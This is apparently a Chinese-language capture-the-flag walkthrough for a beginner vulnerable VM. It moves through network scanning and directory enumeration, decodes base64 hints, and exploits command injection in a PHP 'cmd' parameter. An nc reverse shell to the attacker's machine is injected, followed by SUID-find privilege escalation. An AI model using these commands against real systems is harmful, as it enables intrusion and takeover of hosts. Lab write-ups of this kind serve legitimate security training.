目标：1个flag

级别：初级

建议使用virtualbox桥接模式，使用VMware获取不到IP地址

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.1.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.155
已经开启22、80http服务

3、WEB渗透测试

3.1 使用dirb进行探测

dirb http://192.168.1.109
查看到有robots.txt文件

3.2 访问robots.txt文件，发现密码提示

3.3 密码为base64密码，进行解密

echo bG9sIHRyeSBoYXJkZXIgYnJvCg== | base64 -d
解密后只有一个提示加油

3.4 审查元素查看有一串信息

3.5 使用base64解密三次得到一个页面

echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -decho ZDI5eWEybHVaMmx1Y0hKdlozSmxjM011Y0dod0NnPT0K | base64 -decho d29ya2luZ2lucHJvZ3Jlc3MucGhwCg== | base64 -d

3.6 提示可以进行ping测试

3.7 查看执行信息

http://192.168.1.109/workinginprogress.php?cmd=whoami

3.8 开启NC监听并指定反弹shell

nc -nlvp 4444

执行nc反弹命令

nc -e /bin/bash 192.168.1.6 4444http://192.168.1.109/workinginprogress.php?cmd=nc%20-e%20/bin/bash%20192.168.1.6%204444

4、系统提权

4.1 使用python优化脚本

python -c 'import pty;pty.spawn("/bin/bash");'
4.2 查看sudo -l未能找到

4.3 查找带有SGID权限的二进制

find / -perm -u=s -type f 2>/dev/null
查看可以通过find进行提权

find . -exec /bin/sh -p \; -quitid
